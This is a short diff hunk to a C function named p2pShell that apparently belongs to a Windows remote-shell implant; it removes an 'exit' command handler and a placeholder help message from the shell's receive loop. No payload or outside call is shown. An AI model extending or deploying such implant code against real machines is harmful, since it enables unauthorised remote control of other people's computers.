@@ -54,11 +54,6 @@ void p2pShell(const char* remoteAddr, int remotePort) {
                     WSACleanup();
                     return;
                 }
-                char helpMessage[BUFFER] = "\nNo custom implant features have been implemented yet!\n";
-                if (strcmp(recvData, "exit\n")==0) {
-                    exit(0);
-                    return;
-                }
             }
         }
     }
